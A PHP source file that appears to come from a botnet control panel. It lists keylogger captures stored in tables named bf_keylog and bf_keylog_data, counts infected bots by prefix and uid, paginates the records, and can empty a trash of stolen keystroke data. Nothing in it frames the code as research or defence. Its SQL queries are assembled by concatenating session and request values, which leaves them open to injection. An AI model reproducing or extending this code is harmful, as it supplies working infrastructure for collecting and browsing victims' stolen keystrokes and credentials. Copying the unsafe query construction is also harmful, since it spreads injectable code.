<?php
//error_reporting(-1);

get_function('html_pages');

function counts_bots($row){
	global $list;
	if(!empty($list[$row->hash])) $list[$row->hash]->count_bot = $row->count;
}

function counts_all($row){
	global $list, $mysqli, $Cur;
	if(!empty($list[$row->hash])){		$list[$row->hash]->count = $row->count;
		$list[$row->hash]->count_bot = $mysqli->query_name('SELECT hash, COUNT(DISTINCT(concat(prefix,uid))) count FROM bf_keylog_data WHERE (hash = \''.$row->hash.'\') AND (trash = \''.$Cur['y'].'\')');
	}
}

function get_list($row){
	global $list;
	$row->count_bot = 0;
	$row->count = 0;
	$list[$row->hash] = $row;
}

if(empty($Cur['y'])) $Cur['y'] = 0;
if($Cur['y'] == 1 && $Cur['str'] == 'cleartrash') $mysqli->query('DELETE FROM bf_keylog_data WHERE (trash = \'1\')');

$list = array();
if(!empty($_SESSION['user']->config['klimit'])){	$_SESSION['user']->config['klimit'] = implode('|', json_decode(base64_decode($_SESSION['user']->config['klimit']), true));

	$mysqli->query('SELECT * FROM bf_keylog WHERE (hash REGEXP \'^('.$_SESSION['user']->config['klimit'].')$\') GROUP by post_date LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['keylog'] : $Cur['page']*$_SESSION['user']->config['cp']['keylog'] . ',' . $_SESSION['user']->config['cp']['keylog']), null, 'get_list', false);

	if(!empty($_SESSION['user']->config['prefix'])){		$mysqli->query('SELECT hash, COUNT(id) count FROM bf_keylog_data WHERE (prefix = \''.$_SESSION['user']->config['prefix'].'\') AND (trash = \''.$Cur['y'].'\') AND (hash REGEXP \'^('.$_SESSION['user']->config['klimit'].')$\') GROUP by hash', null, 'counts_all', false);
    }else{    	$mysqli->query('SELECT hash, COUNT(id) count FROM bf_keylog_data WHERE (hash REGEXP \'^('.$_SESSION['user']->config['klimit'].')$\') AND (trash = \''.$Cur['y'].'\') GROUP by hash', null, 'counts_all', false);
    }

    $counts = $mysqli->query_name('SELECT COUNT(id) count FROM bf_keylog WHERE (hash REGEXP \'^('.$_SESSION['user']->config['klimit'].')$\') AND (trash = \''.$Cur['y'].'\')', null, 'count', 0, 60);
}else{	$mysqli->query('SELECT * FROM bf_keylog GROUP by post_date LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['keylog'] : $Cur['page']*$_SESSION['user']->config['cp']['keylog'] . ',' . $_SESSION['user']->config['cp']['keylog']), null, 'get_list', false);

	if(!empty($_SESSION['user']->config['prefix'])){
		$mysqli->query('SELECT hash, COUNT(id) count FROM bf_keylog_data WHERE (prefix = \''.$_SESSION['user']->config['prefix'].'\') AND (trash = \''.$Cur['y'].'\') GROUP by hash', null, 'counts_all', false);
    }else{
    	$mysqli->query('SELECT hash, COUNT(id) count FROM bf_keylog_data WHERE (trash = \''.$Cur['y'].'\') GROUP by hash', null, 'counts_all', false);
    }

	$counts = $mysqli->query_name('SELECT COUNT(id) count FROM bf_keylog', null, 'count', 0, 60);
}

$smarty->assign('list',$list);
$smarty->assign('counts',$counts);
$smarty->assign('pages', html_pages('/keylog/?', $counts, $_SESSION['user']->config['cp']['keylog'], 1, 'kl_list', 'this.href'));

if($Cur['y'] == 1){	if($Cur['ajax'] == 1) print('<script type="text/javascript" language="javascript">document.title = \''. $lang['keylog'] . ' - ' . $lang['trash'] . '\';</script>');
}else{	if($Cur['ajax'] == 1) print('<script type="text/javascript" language="javascript">document.title = \''. $lang['keylog'] . '\';</script>');
}

?>